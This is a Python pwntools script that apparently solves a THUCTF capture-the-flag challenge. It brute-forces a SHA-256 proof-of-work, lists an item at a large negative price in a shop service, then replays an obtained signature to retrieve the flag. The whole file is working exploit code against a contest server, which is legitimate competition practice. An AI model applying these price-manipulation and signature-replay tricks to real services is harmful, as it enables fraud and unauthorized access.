#!/usr/bin/env python3
# coding: utf-8
import pwn
import re
from hashlib import sha256
import itertools
import string
from Crypto.Util.number import bytes_to_long

sha_parse = re.compile(br"sha256\(XXXX \+ ([^)]+).+ ([0-9a-z]+)", re.A)
sig_parse = re.compile(br"sig: (.*)", re.A)

c = pwn.remote('nc.thuctf.redbud.info', port=31707)
powbanner = c.recvline()
#print(powbanner)
match = sha_parse.match(powbanner)
head, tail = match.group(1), match.group(2)
print("head = {}, tail = {}".format(head,tail))

correct = b''
for i in itertools.product(string.ascii_letters + string.digits + '!#$%&*-?', repeat=4):
    b = ''.join(i).encode("ASCII")
    digest = sha256(b + head).hexdigest()
    if digest.encode("ASCII") == tail:
        correct = b
        print("POW FOUND")
        break
c.sendline(b)
c.recvuntil(b'Choice:')

c.sendline(b'1')
c.recvuntil(b'Username:')
c.sendline(b'user1')

c.recvuntil(b'Choice:')
c.sendline(b'4') # sell
c.recvuntil(b'Price:')
c.sendline(b'-158526706883441459')
c.recvuntil(b'Flag:')
c.sendline(b'useless')

c.recvuntil(b'Choice:')
c.sendline(b'1')
c.recvuntil(b'Username:')
c.sendline(b'user2')

c.recvuntil(b'Choice:')
c.sendline(b'5')
c.recvuntil(b'idx:')
c.sendline(b'1')

c.recvuntil(b'Choice:')
c.sendline(b'5')
c.recvuntil(b'idx:')
c.sendline(b'0')

c.recvuntil(b'Choice:')
c.sendline(b'3')
c.recvuntil(b'idx:')
c.sendline(b'0')
c.recvuntil(b'sig:')
c.sendline(b'')
sigline = c.recvline()
sig = sig_parse.search(sigline).group(1)

c.recvuntil(b'Choice:')
c.sendline(b'3')
c.recvuntil(b'idx:')
c.sendline(b'0')
c.recvuntil(b'sig:')
c.sendline(sig)

print(c.recv())

c.close()
